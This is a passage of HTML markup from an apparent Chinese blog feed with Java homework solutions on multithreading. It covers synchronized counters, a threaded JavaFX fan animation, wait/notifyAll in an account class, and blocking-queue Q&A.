class="token number">76</span> <span class="token number">77</span> <span class="token number">78</span> <span class="token number">79</span> <span class="token number">80</span> <span class="token number">81</span> <span class="token number">82</span> <span class="token number">83</span> <span class="token number">84</span> <span class="token number">85</span> <span class="token number">86</span> <span class="token number">87</span> <span class="token number">88</span> <span class="token number">89</span> <span class="token number">90</span> <span class="token number">91</span> <span class="token number">92</span> <span class="token number">93</span> <span class="token number">94</span> <span class="token number">95</span> <span class="token number">96</span> <span class="token number">97</span> <span class="token number">98</span> <span class="token number">99</span> aaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="同步线程编写一个程序启动-1000-个线程-每个线程给初始值为0的变量-sum加1-定义一个integer-包装对象来保存-sum-使用同步和不使用同步来运行这个程序看一看它们的效果"><a class="markdownIt-Anchor" href="#同步线程编写一个程序启动-1000-个线程-每个线程给初始值为0的变量-sum加1-定义一个integer-包装对象来保存-sum-使用同步和不使用同步来运行这个程序看一看它们的效果"></a> (同步线程)编写一个程序，启动 1000 个线程。每个线程给初始值为0的变量 sum加1。定义一个Integer 包装对象来保存 sum。使用同步和不使用同步来运行这个程序，看一看它们的效果</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NonSynchronizedCounter</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        sum<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">NonSynchronizedCounter</span> counter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NonSynchronizedCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token punctuation">]</span> threads <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> threads<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> counter<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span> thread <span class="token operator">:</span> threads<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            thread<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Final sum (Non-Synchronized): "</span> <span class="token operator">+</span> counter<span class="token punctuation">.</span><span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SynchronizedCounter</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        sum<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">SynchronizedCounter</span> counter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SynchronizedCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token punctuation">]</span> threads <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> threads<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> counter<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span> thread <span class="token operator">:</span> threads<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            thread<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Final sum (Synchronized): "</span> <span class="token operator">+</span> counter<span class="token punctuation">.</span><span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="使用控制风扇动画的线程改写编程练习题1528"><a class="markdownIt-Anchor" href="#使用控制风扇动画的线程改写编程练习题1528"></a> 使用控制风扇动画的线程改写编程练习题15.28</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Double</span> <span class="token constant">MIN_WIDTH</span> <span class="token operator">=</span> <span class="token number">320.0</span><span class="token punctuation">;</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Double</span> <span class="token constant">MIN_HEIGHT</span> <span class="token operator">=</span> <span class="token number">200.0</span><span class="token punctuation">;</span>
<span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> stage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">Pane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">VBox</span> fanAndControl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fanAndControl<span class="token punctuation">.</span><span class="token function">setMinWidth</span><span class="token punctuation">(</span><span class="token constant">MIN_WIDTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fanAndControl<span class="token punctuation">.</span><span class="token function">setMinHeight</span><span class="token punctuation">(</span><span class="token constant">MIN_HEIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fanAndControl<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">TOP_CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">HBox</span> fanBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fanBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Pane</span> fanPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    circle<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    circle<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">WHITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fanPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Group</span> group <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 构建运动弧</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Arc</span> moveArc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span> <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token constant">PI</span> <span class="token operator">*</span> <span class="token number">25</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        moveArc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">ROUND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        moveArc<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        group<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>moveArc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    fanPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
    fanBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>fanPane<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">HBox</span> controlBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    controlBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 风扇默认方向为逆时针，用布尔数组规避lambda无法修改外部变量的问题</span>
    <span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span> isActive <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">Boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span> isPause <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">Runnable</span> rotateThread <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>isPause<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>isActive<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    group<span class="token punctuation">.</span><span class="token function">setRotate</span><span class="token punctuation">(</span>group<span class="token punctuation">.</span><span class="token function">getRotate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    group<span class="token punctuation">.</span><span class="token function">setRotate</span><span class="token punctuation">(</span>group<span class="token punctuation">.</span><span class="token function">getRotate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>rotateThread<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Button</span> pauseBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    pauseBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span>
    <span class="token punctuation">{</span>
        isPause<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Button</span> resumeBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Resume"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    resumeBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>isPause<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            isPause<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>rotateThread<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Button</span> reverseBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Reverse"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    reverseBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        isActive<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">!</span>isActive<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    controlBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>pauseBtn<span class="token punctuation">,</span> resumeBtn<span class="token punctuation">,</span> reverseBtn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    fanAndControl<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>fanBox<span class="token punctuation">,</span> controlBox<span class="token punctuation">)</span><span class="token punctuation">;</span>
    pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>fanAndControl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">)</span><span class="token punctuation">;</span>
    stage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
    stage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="使用对象的wait和notifyall方法改写程序清单30-6"><a class="markdownIt-Anchor" href="#使用对象的wait和notifyall方法改写程序清单30-6"></a> 使用对象的wait()和notifyAll()方法改写程序清单30-6</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Account</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> balance <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token keyword">int</span> amount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>account<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span>balance <span class="token operator">&lt;</span> amount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\t\t\tWait for a deposit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                balance <span class="token operator">-=</span> amount<span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\t\t\tWithdraw "</span> <span class="token operator">+</span> amount <span class="token operator">+</span>
                        <span class="token string">"\t\t"</span> <span class="token operator">+</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token keyword">int</span> amount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>account<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                balance <span class="token operator">+=</span> amount<span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Deposit "</span> <span class="token operator">+</span> amount <span class="token operator">+</span>
                        <span class="token string">"\t\t\t\t\t"</span> <span class="token operator">+</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-12</title>
    <url>/2023/12/06/08-54-33/</url>
    <content><![CDATA[<p>java多线程</p>
<span id="more"></span>
<h2 id="buffer-类中的-read-和write-方法可以并行执行吗"><a class="markdownIt-Anchor" href="#buffer-类中的-read-和write-方法可以并行执行吗"></a> Buffer 类中的 read 和write 方法可以并行执行吗?</h2>
<p>在一般情况下，如果没有适当的同步机制，read 和 write 操作可能会并行执行。这可能导致竞态条件，如两个线程同时读或写，可能会导致数据不一致或损坏。因此，通常需要通过同步机制（如 synchronized 关键字、锁或其他并发控制工具）来确保线程安全。</p>
<h2 id="调用-read-方法时如果队列为空会发生什么"><a class="markdownIt-Anchor" href="#调用-read-方法时如果队列为空会发生什么"></a> 调用 read 方法时，如果队列为空会发生什么?</h2>
<p>当队列为空时，尝试执行 read 操作通常会导致线程阻塞或等待，直到队列中有数据可读。这种行为是典型的生产者-消费者问题中的“消费者”行为。在 Java 中，这可以通过 wait() 和 notify() 方法来实现，或使用更高级的并发工具，如 BlockingQueue。</p>
<h2 id="调用-write-方法时如果队列满了会发生什么"><a class="markdownIt-Anchor" href="#调用-write-方法时如果队列满了会发生什么"></a> 调用 write 方法时，如果队列满了会发生什么?</h2>
<p>当队列满时，尝试执行 write 操作通常会导致线程阻塞或等待，直到队列中有足够的空间。这也是生产者-消费者问题中的一种典型情况。类似于 read 操作，这可以通过使用 wait() 和 notify() 或 BlockingQueue 等机制来处理。</p>
<h2 id="什么是阻塞队列java中支持什么阻塞队列"><a class="markdownIt-Anchor" href="#什么是阻塞队列java中支持什么阻塞队列"></a> 什么是阻塞队列？Java中支持什么阻塞队列？</h2>
<p>阻塞队列（Blocking Queue）是一种支持两个附加操作的队列：当队列为空时，获取元素的线程将会被阻塞，直到队列中有新的元素可取；当队列满时，存储元素的线程将会被阻塞，直到队列中有空间可用。阻塞队列是一个非常有用的数据结构，用于生产者-消费者问题，它可以安全地管理多个线程之间的数据交换。</p>
<table>
<thead>
<tr>
<th>队列类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ArrayBlockingQueue</code></td>
<td>基于数组结构的有界阻塞队列</td>
</tr>
<tr>
<td><code>LinkedBlockingQueue</code></td>
<td>基于链表结构的可选有界阻塞队列（默认和最大容量为 <code>Integer.MAX_VALUE</code>）</td>
</tr>
<tr>
<td><code>PriorityBlockingQueue</code></td>
<td>支持优先级排序的无界阻塞队列</td>
</tr>
<tr>
<td><code>DelayQueue</code></td>
<td>使用元素的延迟属性来控制元素的可用性的无界阻塞队列</td>
</tr>
<tr>
<td><code>SynchronousQueue</code></td>
